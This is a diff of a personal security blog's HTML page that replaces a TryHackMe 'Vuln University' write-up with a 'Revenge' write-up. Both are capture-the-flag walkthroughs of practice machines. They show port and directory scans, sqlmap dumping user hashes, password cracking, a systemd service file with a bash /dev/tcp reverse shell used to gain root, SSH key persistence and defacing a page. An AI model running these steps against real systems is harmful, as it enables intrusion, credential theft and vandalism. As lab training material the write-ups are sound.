@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="en-us">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Learn about set-uid bits and a very interesting priv-esc - involving systemctl.'><title>TryHackMe: Vuln University Writeup</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Learn about SQL injections basded on parameters and a neat sudo systemctl exploit.'><title>TryHackMe: Revenge Writeup</title>
 
-<link rel='canonical' href='https://chaudhary1337.github.io/p/tryhackme-vuln-university-writeup/'>
+<link rel='canonical' href='https://chaudhary1337.github.io/p/tryhackme-revenge-writeup/'>
 
-<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='TryHackMe: Vuln University Writeup'>
-<meta property='og:description' content='Learn about set-uid bits and a very interesting priv-esc - involving systemctl.'>
-<meta property='og:url' content='https://chaudhary1337.github.io/p/tryhackme-vuln-university-writeup/'>
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='TryHackMe: Revenge Writeup'>
+<meta property='og:description' content='Learn about SQL injections basded on parameters and a neat sudo systemctl exploit.'>
+<meta property='og:url' content='https://chaudhary1337.github.io/p/tryhackme-revenge-writeup/'>
 <meta property='og:site_name' content='Tanishq Chaudhary'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='suid' /><meta property='article:tag' content='systemctl' /><meta property='article:published_time' content='2021-06-15T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2021-06-15T00:00:00&#43;00:00'/><meta property='og:image' content='https://i.imgur.com/5x36aqY.png' />
-<meta name="twitter:title" content="TryHackMe: Vuln University Writeup">
-<meta name="twitter:description" content="Learn about set-uid bits and a very interesting priv-esc - involving systemctl."><meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:image" content='https://i.imgur.com/5x36aqY.png' />
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='sql-injection' /><meta property='article:tag' content='sudo' /><meta property='article:tag' content='systemctl' /><meta property='article:published_time' content='2021-06-27T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2021-06-27T00:00:00&#43;00:00'/><meta property='og:image' content='https://i.imgur.com/mCXuoCT.png' />
+<meta name="twitter:title" content="TryHackMe: Revenge Writeup">
+<meta name="twitter:description" content="Learn about SQL injections basded on parameters and a neat sudo systemctl exploit."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://i.imgur.com/mCXuoCT.png' />
 <script type="application/javascript">
 var doNotTrack = false;
 if (!doNotTrack) {
@@ -354,9 +354,9 @@ m125 -66 c16 -18 19 -37 19 -134 0 -97 -3 -116 -19 -134 -24 -27 -48 -27 -72
     <article class="has-image main-article">
     <header class="article-header">
         <div class="article-image">
-            <a href="/p/tryhackme-vuln-university-writeup/">
+            <a href="/p/tryhackme-revenge-writeup/">
                 
-                    <img src="https://i.imgur.com/5x36aqY.png" loading="lazy" alt="Featured image of post TryHackMe: Vuln University Writeup" />
+                    <img src="https://i.imgur.com/mCXuoCT.png" loading="lazy" alt="Featured image of post TryHackMe: Revenge Writeup" />
                 
             </a>
         </div>
@@ -374,12 +374,12 @@ m125 -66 c16 -18 19 -37 19 -134 0 -97 -3 -116 -19 -134 -24 -27 -48 -27 -72
     
 
     <h2 class="article-title">
-        <a href="/p/tryhackme-vuln-university-writeup/">TryHackMe: Vuln University Writeup</a>
+        <a href="/p/tryhackme-revenge-writeup/">TryHackMe: Revenge Writeup</a>
     </h2>
 
     
     <h3 class="article-subtitle">
-        Learn about set-uid bits and a very interesting priv-esc - involving systemctl.
+        Learn about SQL injections basded on parameters and a neat sudo systemctl exploit.
     </h3>
     <footer class="article-time">
         <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
@@ -390,162 +390,294 @@ m125 -66 c16 -18 19 -37 19 -134 0 -97 -3 -116 -19 -134 -24 -27 -48 -27 -72
 
 
 
-        <time class="article-time--published">Jun 15, 2021</time>
+        <time class="article-time--published">Jun 27, 2021</time>
     </footer></div>
 </header>
 
     <section class="article-content">
-    <p><a class="link" href="https://tryhackme.com/room/vulnversity"  target="_blank" rel="noopener"
+    <p><a class="link" href="https://tryhackme.com/room/revenge"  target="_blank" rel="noopener"
     >Play</a></p>
-<h2 id="task-1---deploy-the-machine">Task 1 - Deploy the machine</h2>
-<p>ezpz</p>
-<h2 id="task-2---recon">Task 2 - Recon</h2>
-<p>classic nmap scan</p>
-<pre><code>❯ nmap -sC -sV -A 10.10.197.89
-Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-07 21:43 EST
-Nmap scan report for 10.10.197.89
-Host is up (0.18s latency).
-Not shown: 994 closed ports
-PORT     STATE SERVICE     VERSION
-21/tcp   open  ftp         vsftpd 3.0.3
-22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
+<p>This room has a solid start:</p>
+<pre><code>To whom it may concern,
+
+I know it was you who hacked my blog.  I was really impressed with your skills.  You were a little sloppy 
+and left a bit of a footprint so I was able to track you down.  But, thank you for taking me up on my offer.  
+I've done some initial enumeration of the site because I know *some* things about hacking but not enough.  
+For that reason, I'll let you do your own enumeration and checking.
+
+What I want you to do is simple.  Break into the server that's running the website and deface the front page.  
+I don't care how you do it, just do it.  But remember...DO NOT BRING DOWN THE SITE!  We don't want to cause irreparable damage.
+
+When you finish the job, you'll get the rest of your payment.  We agreed upon $5,000.  
+Half up-front and half when you finish.
+
+Good luck,
+
+Billy
+</code></pre><h2 id="1-scanning--enumeration">1. Scanning &amp; Enumeration</h2>
+<p>We do the below scans in parallel.</p>
+<h3 id="11-port-scanning">1.1. Port Scanning</h3>
+<pre><code>Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
-|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
-|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
-|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
-139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
-445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
-3128/tcp open  http-proxy  Squid http proxy 3.5.12
-|_http-server-header: squid/3.5.12
-|_http-title: ERROR: The requested URL could not be retrieved
-3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
-|_http-server-header: Apache/2.4.18 (Ubuntu)
-|_http-title: Vuln University
-Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+|   2048 72:53:b7:7a:eb:ab:22:70:1c:f7:3c:7a:c7:76:d9:89 (RSA)
+|   256 43:77:00:fb:da:42:02:58:52:12:7d:cd:4e:52:4f:c3 (ECDSA)
+|_  256 2b:57:13:7c:c8:4f:1d:c2:68:67:28:3f:8e:39:30:ab (ED25519)
+80/tcp open  http    nginx 1.14.0 (Ubuntu)
+|_http-favicon: Unknown favicon MD5: E859DC70A208F0F0242640410296E06A
+| http-methods: 
+|_  Supported Methods: HEAD GET OPTIONS
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+|_http-title: Home | Rubber Ducky Inc.
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p>Info gathered:</p>
+<ul>
+<li>port 22 open with SSH running</li>
+<li>port 80 open with http running</li>
+</ul>
+<p>A complete port scan does not reveal any more information.</p>
+<h3 id="12-web-enumeration">1.2. Web Enumeration</h3>
+<p>Gobuster scan:</p>
+<pre><code>┌──(kali㉿kali)-[~]
+└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x 'php,html,txt' -t 108 -q -u 10.10.212.230
+/index                (Status: 200) [Size: 8541]
+/login                (Status: 200) [Size: 4980]
+/contact              (Status: 200) [Size: 6906]
+/products             (Status: 200) [Size: 7254]
+/static               (Status: 301) [Size: 194] [--&gt; http://10.10.212.230/static/]
+/admin                (Status: 200) [Size: 4983]                                  
+/requirements.txt     (Status: 200) [Size: 258]
+</code></pre><h3 id="13-web-exploration">1.3. Web Exploration</h3>
+<p>home page of rubber ducky
+<img src="https://i.imgur.com/PY9GOnn.jpg" alt="home page of rubber ducky"  /></p>
+<p>Login page redirects to an <code>action=#</code> in the url.
+<img src="https://i.imgur.com/mx5kY2I.png" alt="login page redirects to an &lt;code&gt;action=#&lt;/code&gt; in the url"  /></p>
+<p><code>requirements.txt</code> file:</p>
+<pre><code>attrs==19.3.0
+bcrypt==3.1.7
+cffi==1.14.1
+click==7.1.2
+Flask==1.1.2
+Flask-Bcrypt==0.7.1
+Flask-SQLAlchemy==2.4.4
+itsdangerous==1.1.0
+Jinja2==2.11.2
+MarkupSafe==1.1.1
+pycparser==2.20
+PyMySQL==0.10.0
+six==1.15.0
+SQLAlchemy==1.3.18
+Werkzeug==1.0.1
+</code></pre><h3 id="14-sub-domain-fuzzing-fail-can-be-skipped">1.4. Sub-domain Fuzzing (fail) (can be skipped)</h3>
+<p>Add the line <code>10.10.212.230   ducky.thm</code> to the <code>/etc/hosts</code> file.</p>
+<pre><code>┌──(kali㉿kali)-[~]
+└─$ cat /etc/hosts 
+127.0.0.1       localhost
+127.0.1.1       kali
+10.10.212.230   ducky.thm
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+</code></pre><p>We find any subdomains by using <code>wfuzz</code>: <code>wfuzz -c -w ~/Desktop/tools/files/subdomains-top1million-5000.txt -u 'http://ducky.thm/' -H &quot;Host: FUZZ.ducky.thm&quot;</code></p>
+<p>Here&rsquo;s whats happening:</p>
+<ul>
+<li>-c is for color</li>
+<li>-w is for wordlist</li>
+<li>-H is for host</li>
+<li>-u is for URL</li>
+<li>FUZZ is replaced by the item in the wordlist</li>
+</ul>
+<pre><code>┌──(kali㉿kali)-[~]
+└─$ wfuzz -c -w ~/Desktop/tools/files/subdomains-top1million-5000.txt -u 'http://ducky.thm/' -H &quot;Host: FUZZ.ducky.thm&quot; --hw 636
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
 
-Host script results:
-|_clock-skew: mean: 1h40m01s, deviation: 2h53m12s, median: 0s
-|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
-| smb-os-discovery: 
-|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
-|   Computer name: vulnuniversity
-|   NetBIOS computer name: VULNUNIVERSITY\x00
-|   Domain name: \x00
-|   FQDN: vulnuniversity
-|_  System time: 2021-03-07T21:43:45-05:00
-| smb-security-mode: 
-|   account_used: guest
-|   authentication_level: user
-|   challenge_response: supported
-|_  message_signing: disabled (dangerous, but default)
-| smb2-security-mode: 
-|   2.02: 
-|_    Message signing enabled but not required
-| smb2-time: 
-|   date: 2021-03-08T02:43:46
-|_  start_date: N/A
+Target: http://ducky.thm/
+Total requests: 4989
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 47.10 seconds
-</code></pre><h3 id="scan-the-box-how-many-ports-are-open">Scan the box, how many ports are open?</h3>
-<p><code>6</code></p>
-<h3 id="what-version-of-the-squid-proxy-is-running-on-the-machine">What version of the squid proxy is running on the machine?</h3>
-<p><code>3.5.12</code></p>
-<h3 id="how-many-ports-will-nmap-scan-if-the-flag--p-400-was-used">How many ports will nmap scan if the flag -p-400 was used?</h3>
-<p><code>400</code>
-(bruh)</p>
-<h3 id="using-the-nmap-flag--n-what-will-it-not-resolve">Using the nmap flag -n what will it not resolve?</h3>
-<p><code>dns</code></p>
-<h3 id="what-is-the-most-likely-operating-system-this-machine-is-running">What is the most likely operating system this machine is running?</h3>
-<p><code>ubuntu</code></p>
-<h3 id="what-port-is-the-web-server-running-on">What port is the web server running on?</h3>
-<p><code>3333</code></p>
-<h3 id="its-important-to-ensure-you-are-always-doing-your-reconnaissance-thoroughly-before-progressing-knowing-all-open-services-which-can-all-be-points-of-exploitation-is-very-important-dont-forget-that-ports-on-a-higher-range-might-be-open-so-always-scan-ports-after-1000-even-if-you-leave-scanning-in-the-background">Its important to ensure you are always doing your reconnaissance thoroughly before progressing. Knowing all open services (which can all be points of exploitation) is very important, don&rsquo;t forget that ports on a higher range might be open so always scan ports after 1000 (even if you leave scanning in the background)</h3>
-<p>ok</p>
-<h2 id="task-3---locating-directories-using-gobuster">Task 3 - Locating directories using gobuster</h2>
-<p>(have not included the gobuster scan results, since its pretty basic)</p>
-<h3 id="what-is-the-directory-that-has-an-upload-form-page">What is the directory that has an upload form page?</h3>
-<p><code>/internal/</code></p>
-<h2 id="task-4---compromise-the-webserver">Task 4 - Compromise the webserver</h2>
-<p>We see the option to upload the files. The default way to try and upload the <code>phpreverseshell.php</code> files, but apparently <code>.php</code> is not allowed.</p>
-<p>At this point, the room suggests using burpsuite to intercept the requests, and try out different php extensions. However, its more simple to just do it by hand :D</p>
-<h3 id="run-this-attack-what-extension-is-allowed">Run this attack, what extension is allowed?</h3>
-<p><code>phtml</code></p>
-<p>Once you have the <code>phprevshell.phtml</code> uploaded, go to <code>/include/uploads/phprevshell.phtml</code> and setup netcat in parallel. Once you get in, get a proper shell by doing <code>python3 -c &quot;import pty; pty.spawn('/bin/bash')</code>. For the next question, just do <code>cat /etc/passwd</code>.</p>
-<h3 id="what-is-the-name-of-the-user-who-manages-the-webserver">What is the name of the user who manages the webserver?</h3>
-<p><code>bill</code></p>
-<h3 id="what-is-the-user-flag">What is the user flag?</h3>
-<p>{hmmmmmmmmmmmmmmmmmmmmmmmm}</p>
-<h2 id="task-5---priviledge-escalation">Task 5 - Priviledge Escalation</h2>
-<blockquote>
-<p>In Linux, SUID (set owner userId upon execution) is a special type of file permission given to a file. SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).</p>
-</blockquote>
-<blockquote>
-<p>For example, the binary file to change your password has the SUID bit set on it (/usr/bin/passwd). This is because to change your password, it will need to write to the shadowers file that you do not have access to, root does, so it has root privileges to make the right changes.</p>
-</blockquote>
-<p>Using the command <code>find</code>, we get:</p>
-<h3 id="on-the-system-search-for-all-suid-files-what-file-stands-out">On the system, search for all SUID files. What file stands out?</h3>
-<p><code>/bin/systemctl</code></p>
-<h3 id="become-root-and-get-the-last-flag-rootroottxt">Become root and get the last flag (/root/root.txt)</h3>
-<p>For this privesc, I followed <a class="link" href="https://gist.github.com/A1vinSmith/78786df7899a840ec43c5ddecb6a4740"  target="_blank" rel="noopener"
-    >Alvin Smith&rsquo;s Privilege Escalation</a></p>
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                 
+=====================================================================
+
+
+Total time: 0
+Processed Requests: 4989
+Filtered Requests: 4989
+Requests/sec.: 0
+</code></pre><h3 id="15-sqli-fail-can-be-skipped">1.5. SQLI (fail) (can be skipped)</h3>
+<p>We can check for SQL Injection vulnerabilities using SQLmap: <code>sqlmap -u http://10.10.212.230/admin --forms --dump-all</code></p>
+<p>However,</p>
+<pre><code>[ERROR] all tested parameters do not appear to be injectable.
+</code></pre><h3 id="16-login-page-exploration-fail-can-be-skipped">1.6. Login Page Exploration (Fail) (can be skipped)</h3>
+<pre><code>GET /login?action= HTTP/1.1
+Host: 10.10.212.230
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://10.10.212.230/login
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+</code></pre><p>Looks like &hellip; the username and password is not being sent at all?!</p>
+<p>This means that we are looking at something else &hellip;
+Even in sqlmap, I noticed the form that was being epxloited was the <code>GET</code> form,</p>
+<pre><code>[01:25:18] [INFO] searching for forms
+[#1] form:
+GET http://10.10.212.230/login?action=
+</code></pre><p>This means that we want to fill in and add parameters for <code>username</code> and <code>password</code>.</p>
+<p>Perhaps something like this: http://10.10.212.230/login?username=&amp;password=&amp;action=</p>
+<p>Oh! And recall we had <code>pymysql</code> present in the <code>requirements.txt</code> file. This means we are using MySQL as the database.</p>
+<p>So I tried and then tried some more but it failed. What next? Well I noticed something interesting back in the error pages.</p>
+<h3 id="17-error-error">1.7. Error! Error!</h3>
+<p>You see, the <code>/products/1</code> page is fine, but <code>/products/100</code> page gives a 500 error. This is server side error.
+<img src="https://i.imgur.com/WkcowAt.png" alt="500 error code seen on non existent product"  /></p>
+<p>On the other hand, a page like <code>/pwn</code> gives:
+<img src="https://i.imgur.com/mEnYPNA.png" alt="404 error code not found"  /></p>
+<p>See the difference? Maybe, what we are looking for, is an attack on the <code>/products/</code> page!</p>
+<p>Run: <code>sqlmap -u http://10.10.212.230/products/1  --dump</code></p>
+<pre><code>Database: duckyinc
+Table: system_user
+[3 entries]
++----+----------------------+--------------+--------------------------------------------------------------+
+| id | email                | username     | _password                                                    |
++----+----------------------+--------------+--------------------------------------------------------------+
+| 1  | sadmin@duckyinc.org  | server-admin | {hash_was_here!} |
+| 2  | kmotley@duckyinc.org | kmotley      | $2a$12$LEENY/LWOfyxyCBUlfX8Mu8viV9mGUse97L8x.4L66e9xwzzHfsQa |
+| 3  | dhughes@duckyinc.org | dhughes      | $2a$12$22xS/uDxuIsPqrRcxtVmi.GR2/xh0xITGdHuubRF4Iilg5ENAFlcK |
++----+----------------------+--------------+--------------------------------------------------------------+
+</code></pre><p>In the <code>user</code> table we get the first flag :D</p>
+<h3 id="hash-cracking">Hash Cracking</h3>
+<pre><code>┌──(kali㉿kali)-[/tmp]
+└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 256 for all loaded hashes
+Will run 6 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+{hidden}         (?)
+1g 0:00:00:00 DONE (2021-06-27 01:49) 3.846g/s 1038p/s 1038c/s 1038C/s hellokitty..hotmail
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed
+</code></pre><h2 id="2-foothold">2. Foothold</h2>
+<p>We know the <code>/login</code> and the <code>/admin</code> pages are completely useless. That leaves us with SSH.</p>
+<p>After lots of manual bruteforcing, I found the username is actually <code>server-admin</code> and not <code>sadmin</code>.</p>
+<pre><code>┌──(kali㉿kali)-[/tmp]
+└─$ ssh server-admin@10.10.212.230
+server-admin@10.10.212.230's password: 
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-112-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+ System information disabled due to load higher than 1.0
+
+
+8 packages can be updated.
+0 updates are security updates.
+
+
+################################################################################
+#                        Ducky Inc. Web Server 00080012                        #
+#            This server is for authorized Ducky Inc. employees only           #
+#                  All actiions are being monitored and recorded               #
+#                    IP and MAC addresses have been logged                     #
+################################################################################
+Last login: Wed Aug 12 20:09:36 2020 from 192.168.86.65
+server-admin@duckyinc:~$
+</code></pre><h3 id="21-exploration">2.1. Exploration</h3>
+<p><strong>Users</strong></p>
+<pre><code>server-admin@duckyinc:~$ ls /home
+server-admin
+</code></pre><p><strong>crontab</strong></p>
+<pre><code>server-admin@duckyinc:~$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
+#
+</code></pre><p><strong>SUID</strong></p>
+<pre><code>server-admin@duckyinc:~$ find / -type f -perm -u=s 2&gt; /dev/null
+/usr/bin/newgidmap
+/usr/bin/newuidmap
+/usr/bin/sudo
+/usr/bin/pkexec
+/usr/bin/chsh
+/usr/bin/traceroute6.iputils
+/usr/bin/at
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/snapd/snap-confine
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</code></pre><p><strong>SUDO</strong></p>
+<pre><code>server-admin@duckyinc:~$ sudo -l
+[sudo] password for server-admin: 
+Matching Defaults entries for server-admin on duckyinc:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User server-admin may run the following commands on duckyinc:
+    (root) /bin/systemctl start duckyinc.service, /bin/systemctl enable duckyinc.service, /bin/systemctl restart
+        duckyinc.service, /bin/systemctl daemon-reload, sudoedit /etc/systemd/system/duckyinc.service
+</code></pre><p>Great! Looks like we have a way to root!</p>
+<h2 id="3-privesc">3. PrivEsc</h2>
+<h3 id="31-getting-root">3.1. Getting root</h3>
+<p>Type in: <code>sudoedit /etc/systemd/system/duckyinc.service</code> and replace the contents with the below.</p>
 <pre><code>[Unit]
-Description=roooooooooot
+Description=pwn
 
 [Service]
 Type=simple
 User=root
-ExecStart=/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.8.150.214/9999 0&gt;&amp;1'
+ExecStart=/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/IP/1337 0&gt;&amp;1'
 
 [Install]
 WantedBy=multi-user.target
-</code></pre><p>Here are the steps:</p>
-<ol>
-<li>create a <code>root.service</code> file on your machine with the details given above.</li>
-<li>Using the upload option in the <code>/internal/</code> directory of the website, upload this file. It&rsquo;ll throw and error of the extension as not permitted. Change <code>root.service</code> to <code>root.phtml</code> (why?) and you should be good to go.</li>
-<li>In the target machine, just rename the file again.</li>
-<li>Instead of 2, 3, you can also use <code>nc</code> or any other methods you prefer.</li>
-<li>Run <code>/bin/systemctl enable /var/www/html/internal/uploads/root.service</code></li>
-<li>Start <code>nc</code> on your machine, on the port you set in the <code>root.service</code> file in step  1 (9999 here)</li>
-<li>Run <code>/bin/systemctl start root.service</code></li>
-<li>PWN</li>
-</ol>
-<pre><code>www-data@vulnuniversity:/var/www/html/internal/uploads$ cat root.service
-cat root.service
-[Unit]
-Description=roooooooooot
-
-[Service]
-Type=simple
-User=root
-ExecStart=/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.8.150.214/9999 0&gt;&amp;1'
-
-[Install]
-WantedBy=multi-user.target
-www-data@vulnuniversity:/var/www/html/internal/uploads$ /bin/systemctl enable /var/www/html/internal/uploads/root.service
-&lt;s$ /bin/systemctl enable /var/www/html/internal/uploads/root.service        
-Created symlink from /etc/systemd/system/multi-user.target.wants/root.service to /var/www/html/internal/uploads/root.service.
-Created symlink from /etc/systemd/system/root.service to /var/www/html/internal/uploads/root.service.
-www-data@vulnuniversity:/var/www/html/internal/uploads$ /bin/systemctl start root.service
-&lt;r/www/html/internal/uploads$ /bin/systemctl start root.service 
-</code></pre><pre><code>❯ nc -lnvp 9999
-listening on [any] 9999 ...
-connect to [10.8.150.214] from (UNKNOWN) [10.10.185.229] 43756
-bash: cannot set terminal process group (1792): Inappropriate ioctl for device
+</code></pre><p>Make sure to replace the IP as per your attacking machine. Also, start a listener <code>nc -lnvp 1337</code></p>
+<p>I did the following,</p>
+<pre><code>server-admin@duckyinc:~$ sudo /bin/systemctl daemon-reload
+server-admin@duckyinc:~$ sudo /bin/systemctl enable duckyinc.service
+server-admin@duckyinc:~$ sudo /bin/systemctl restart duckyinc.service
+server-admin@duckyinc:~$ sudo /bin/systemctl start duckyinc.service
+</code></pre><p>And we have the shell!</p>
+<pre><code>┌──(kali㉿kali)-[~]
+└─$ nc -lnvp 1337         
+listening on [any] 1337 ...
+connect to [10.17.8.184] from (UNKNOWN) [10.10.212.230] 44520
+bash: cannot set terminal process group (16663): Inappropriate ioctl for device
 bash: no job control in this shell
-root@vulnuniversity:/# whoami
-whoami
-root
-root@vulnuniversity:/# cd /root
+root@duckyinc:/# cd /root
 cd /root
-root@vulnuniversity:~# ls
-ls
-root.txt
-root@vulnuniversity:~# cat root.txt
-cat root.txt
-{hell yeah}
-root@vulnuniversity:~# 
-</code></pre>
+root@duckyinc:~# ls
+</code></pre><p>Feel free to <code>root@duckyinc:~/.ssh# echo &quot;{your_own_id_rsa.pub_key_here}&quot; &gt;&gt; authorized_keys</code> for a ssh login.</p>
+<h3 id="32-defacing-website">3.2. Defacing Website</h3>
+<pre><code>root@duckyinc:/var/www/duckyinc/templates# echo &quot;pwned by chaudhary1337&quot; &gt; index.html
+root@duckyinc:/var/www/duckyinc/templates# cd ~
+root@duckyinc:~# ls
+flag3.txt
+root@duckyinc:~# cat flag3.txt 
+thm{yeee}
+</code></pre><p>System compromised</p>
+
 </section>
 
 
@@ -553,7 +685,9 @@ root@vulnuniversity:~#
     
     <section class="article-tags">
         
-            <a href="/tags/suid/">suid</a>
+            <a href="/tags/sql-injection/">sql-injection</a>
+        
+            <a href="/tags/sudo/">sudo</a>
         
             <a href="/tags/systemctl/">systemctl</a>
         
@@ -574,90 +708,90 @@ root@vulnuniversity:~#
                 
                     
 <article class="has-image">
-    <a href="/p/tryhackme-revenge-writeup/">
+    <a href="/p/tryhackme-inferno-writeup/">
         
         
             <div class="article-image">
                 
-                    <img src="https://i.imgur.com/mCXuoCT.png" loading="lazy" data-key="" data-hash="https://i.imgur.com/mCXuoCT.png"/>
+                    <img src="https://i.imgur.com/4t9185h.jpg" loading="lazy" data-key="" data-hash="https://i.imgur.com/4t9185h.jpg"/>
                 
             </div>
         
 
         <div class="article-details">
-            <h2 class="article-title">TryHackMe: Revenge Writeup</h2>
+            <h2 class="article-title">TryHackMe: Inferno Writeup</h2>
         </div>
     </a>
 </article>
                 
                     
 <article class="has-image">
-    <a href="/p/tryhackme-anonymous-writeup/">
+    <a href="/p/tryhackme-agent-sudo-writeup/">
         
         
             <div class="article-image">
                 
-                    <img src="https://i.imgur.com/kd6mc4d.jpg" loading="lazy" data-key="" data-hash="https://i.imgur.com/kd6mc4d.jpg"/>
+                    <img src="https://i.imgur.com/NoIdF01.png" loading="lazy" data-key="" data-hash="https://i.imgur.com/NoIdF01.png"/>
                 
             </div>
         
 
         <div class="article-details">
-            <h2 class="article-title">TryHackMe: Anonymous Writeup</h2>
+            <h2 class="article-title">TryHackMe: Agent Sudo Writeup</h2>
         </div>
     </a>
 </article>
                 
                     
 <article class="has-image">
-    <a href="/p/tryhackme-coldbox-writeup-all-paths/">
+    <a href="/p/tryhackme-biohazard-writeup/">
         
         
             <div class="article-image">
                 
-                    <img src="https://i.imgur.com/k2cJkVq.png" loading="lazy" data-key="" data-hash="https://i.imgur.com/k2cJkVq.png"/>
+                    <img src="https://i.imgur.com/d7dVxxR.png" loading="lazy" data-key="" data-hash="https://i.imgur.com/d7dVxxR.png"/>
                 
             </div>
         
 
         <div class="article-details">
-            <h2 class="article-title">TryHackMe: ColdBox Writeup (All Paths)</h2>
+            <h2 class="article-title">TryHackMe: Biohazard Writeup</h2>
         </div>
     </a>
 </article>
                 
                     
 <article class="has-image">
-    <a href="/p/tryhackme-mr-robot-writeup/">
+    <a href="/p/tryhackme-brute-it-writeup/">
         
         
             <div class="article-image">
                 
-                    <img src="https://i.imgur.com/gsFux0D.png" loading="lazy" data-key="" data-hash="https://i.imgur.com/gsFux0D.png"/>
+                    <img src="https://i.imgur.com/oMbEPD6.jpg" loading="lazy" data-key="" data-hash="https://i.imgur.com/oMbEPD6.jpg"/>
                 
             </div>
         
 
         <div class="article-details">
-            <h2 class="article-title">TryHackMe: Mr Robot Writeup</h2>
+            <h2 class="article-title">TryHackMe: Brute It Writeup</h2>
         </div>
     </a>
 </article>
                 
                     
 <article class="has-image">
-    <a href="/p/tryhackme-root-me-writeup/">
+    <a href="/p/tryhackme-dog-cat-vm-writeup/">
         
         
             <div class="article-image">
                 
-                    <img src="https://i.imgur.com/1xtAlAB.png" loading="lazy" data-key="" data-hash="https://i.imgur.com/1xtAlAB.png"/>
+                    <img src="https://i.imgur.com/nSkIlFr.png" loading="lazy" data-key="" data-hash="https://i.imgur.com/nSkIlFr.png"/>
                 
             </div>
         
 
         <div class="article-details">
-            <h2 class="article-title">TryHackMe: Root Me Writeup</h2>
